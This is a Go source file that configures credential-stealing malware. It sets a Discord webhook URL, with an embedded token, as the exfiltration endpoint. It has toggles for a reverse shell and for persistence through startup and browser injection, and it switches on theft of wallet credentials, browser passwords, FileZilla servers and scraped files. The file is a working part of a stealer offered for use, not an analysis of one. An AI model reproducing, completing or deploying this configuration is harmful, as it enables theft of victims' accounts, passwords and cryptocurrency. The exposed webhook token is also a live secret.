package main

var webhookUrl = "https://discord.com/api/webhooks/1153402899771183296/tQ_o2vPUhuY_uC8ScMeVXWKNj2XZqBEFfu5mK-UNfn0y5rJySTaiD_PzTQHY3qEfWkhe"
var webhookEncrypted = false
var hitMessage = ""

// embed color (0-16777215 are valid)
var embedColor = 2715638

// shell related
var reverseShell = false
var reverseShellHost = ""
var reverseShellPort = ""

// injection related
var injectIntoDiscord = false // In Development
var injectIntoStartup = false
var injectIntoBrowsers = false

// enable/disable heavy-load stealing functions (can increase program runtime considerably)
var getDiscordTokens = false
var getWalletCredentials = true
var getBrowserCredentials = true
var getFileZillaServers = true
var getSteamSession = false
var getTelegramSession = false
var getInstalledSoftware = true
var getNetworkConnections = false
var getScrapedFiles = true
